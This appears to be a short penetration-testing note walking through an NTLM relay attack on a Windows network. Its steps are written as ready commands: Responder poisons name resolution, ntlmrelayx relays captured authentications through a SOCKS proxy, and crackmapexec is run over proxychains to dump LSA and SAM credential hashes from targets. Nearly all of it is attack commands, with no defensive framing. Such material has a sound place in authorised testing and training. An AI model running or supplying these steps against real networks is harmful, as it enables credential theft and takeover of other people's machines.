# 1. Turn of smb and http in responder.conf

```
SMB = off
HTTP = off
```

![[Pasted image 20251219205543.png]]
# 2. Run The Responder
 
```
sudo responder -I eth0 -w
```

# 3. run ntlmrelayx with proxychains

```
sudo python3 ntlmrelayx.py -tf ~/Desktop/targets -socks -smb2support
```

# 4. ntlmrelayx dumping the local account hashes with the relay:

![[Pasted image 20251219205650.png]]

# Type `socks` into your relay prompt

![[Pasted image 20251219205733.png|502]]
# 6. Since we have an available session, we can start using ``proxychains`` to take advantage of our admin rights on the target. Before we do, make sure `/etc/proxychains.conf` is configured to use port `1080`

# Run crackmapexec with proxychains to DUMP `LSA` and `SAM` Hashes

```
proxychains crackmapexec smb <MACHINE_IP> -u Administrator -p password --lsa
```

![[Pasted image 20251219210113.png]]

**Reffer to this Article**
https://tw1sm.github.io/2021-02-15-socks-relay/
